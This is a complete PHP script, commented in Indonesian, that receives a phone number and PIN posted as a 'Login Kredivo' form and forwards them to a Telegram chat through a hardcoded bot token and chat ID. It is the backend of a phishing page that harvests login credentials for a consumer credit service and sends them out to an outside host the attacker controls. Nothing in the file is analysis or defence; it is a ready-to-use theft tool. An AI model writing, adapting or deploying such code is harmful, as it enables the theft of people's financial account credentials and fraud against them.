<?php
// Ganti dengan Token Bot Telegram Anda
$botToken = "7673810619:AAFBi0aUwLPWbhrMn2yP6OTz1L84LAnwJD4";
// Ganti dengan ID chat atau ID grup tempat pesan akan dikirim
$chatId = "7832654476";

// Ambil data JSON dari permintaan
$data = json_decode(file_get_contents("php://input"), true);

// Pastikan data yang dibutuhkan tersedia
if (isset($data['nomor']) && isset($data['pin'])) {
    $nomor = $data['nomor'];
    $pin = $data['pin'];

    // Buat pesan yang akan dikirim
    $message = "🔒 Login Kredivo\n\n📱 Nomor Handphone: $nomor\n🔑 PIN: $pin";

    // URL untuk mengirim pesan ke Telegram
    $url = "https://api.telegram.org/bot$botToken/sendMessage";

    // Data yang dikirimkan ke Telegram
    $postData = [
        'chat_id' => $chatId,
        'text' => $message
    ];

    // Setup cURL untuk mengirim POST request ke Telegram
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($postData));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

    // Eksekusi permintaan dan ambil responsnya
    $response = curl_exec($ch);
    curl_close($ch);

    // Cek respons dari Telegram
    if ($response) {
        echo json_encode(["success" => true]);
    } else {
        echo json_encode(["success" => false]);
    }
} else {
    // Jika data tidak lengkap, kirim respons error
    echo json_encode(["success" => false, "message" => "Data tidak lengkap."]);
}
?>
